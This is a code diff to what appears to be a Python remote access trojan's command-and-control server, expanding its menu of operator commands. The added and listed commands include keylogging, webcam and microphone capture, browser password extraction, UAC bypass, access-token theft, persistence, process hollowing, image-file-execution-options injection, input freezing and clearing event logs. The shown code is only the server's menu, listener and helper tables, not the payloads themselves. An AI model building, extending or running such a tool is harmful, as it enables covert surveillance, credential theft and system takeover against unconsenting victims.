@@ -15,31 +15,46 @@ commands = {'help': ['Show this help'],
             'select': ['Select a client by its index'],
             'quit': ['Background current connection'],
             'kill': ['Kill current connection'],
+            'cls': ['Clear screen'],
             'lcd': ['Change local working directory'],
             'lls': ['List local files'],
-            'getinfo': ['Get system information'],
             'upload': ['Upload a file to client'],
             'download': ['Download a file from client'],
-            'run': ['Create a process without waiting for termination'],
-            'ps': ['List running process'],
             'screenshot': ['Grab a screenshot'],
             'webcam': ['Take a snapshot from webcam'],
-            'keylog': ['Capture keystrokes'],
             'record': ['Record an audio from microphone'],
-            'drives': ['List drives'],
-            'idletime': ['Display how much time the user is inactive'],
+            'keylogger': ['Capture keystrokes'],
+            'ps': ['List running process'],
+            'pkill': ['Terminate a running process'],
+            'run': ['Create a process without waiting for termination'],
+            'hiderun': ['Create a process in hidden mode'],
+            'persistence': ['Apply persistence mechanism'],
             'bypassuac': ['Elevate as administrator without UAC prompt'],
             'stealtoken': ['Duplicate access token from a running process'],
-            'persistence': ['Run automatically at startup'],
             'browser': ['Extract data from web browser'],
+            'getinfo': ['Get system information'],
+            'idletime': ['Display how much time the user is inactive'],
+            'drives': ['List drives'],
+            'startup': ['List startup items'],
+            'software': ['List installed software'],
+            'ifeo': ['Image file execution options injection'],
             'runpe': ['Process hollowing'],
-            'poweroff': ['Fast shutdown'],
+            'poweroff': ['Perform emergency shutdown'],
             'setcritical': ['Set as critical process'],
             'msgbox': ['Pop up a custom message box'],
-            'run_hide': ['Create a hidden process'],
-            'askpass': ['Pop up a password prompt'],
             'askuac': ['Ask for UAC elevation'],
+            'askpass': ['Pop up a password prompt'],
+            'zip': ['Create a zip archive'],
+            'unzip': ['Extract files from a zip archive'],
+            'openwin': ['Get list of open windows'],
+            'activewin': ['Get last active window'],
+            'getclip': ['Get clipboard text'],
+            'setclip': ['Copy text to clipboard'],
             'filewatch': ['Monitor a directory tree for changes'],
+            'procmon': ['Monitor specific process creation'],
+            'freeze': ['Block keyboard and mouse input'],
+            'openurl': ['Open a url in web browser'],
+            'wallpaper': ['Change desktop background'],
             'clearlog': ['Clear event logs']
             }
 
@@ -59,6 +74,7 @@ class Server:
             self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             self.socket.bind((self.host, self.port))
             self.socket.listen(5)
+            print('[+] Listening on port {}'.format(self.port))
         except socket.error as e:
             print(e)
             sys.exit(1)
@@ -86,6 +102,8 @@ class Server:
                 elif cmd in ['quit', 'exit']:
                     self.socket.close()
                     sys.exit(0)
+                elif cmd in ['cls', 'clear']:
+                    subprocess.call('cls', shell=True)
                 elif cmd == 'list':
                     self.list_connections()
                 elif 'select' in cmd:
@@ -338,8 +356,9 @@ class Alias:
 
 class Helper:
     cmds = {
-        'persistence': ['persistence_registry', 'persistence_schtasks', 'persistence_service'],
+        'persistence': ['persistence_startup', 'persistence_registry', 'persistence_schtasks', 'persistence_service'],
         'bypassuac': ['bypassuac_fodhelper', 'bypassuac_clr'],
+        'keylogger': ['keylogger_start', 'keylogger_stop', 'keylogger_save'],
         'stealtoken': ['stealtoken_system', 'stealtoken_ti', 'stealtoken_admin', 'run_as_user', 'rus_as_admin'],
         'browser': ['get_passwords chrome', 'get_passwords edge', 'get_bookmarks chrome', 'get_bookmarks edge',
                     'get_history chrome', 'get_history edge']
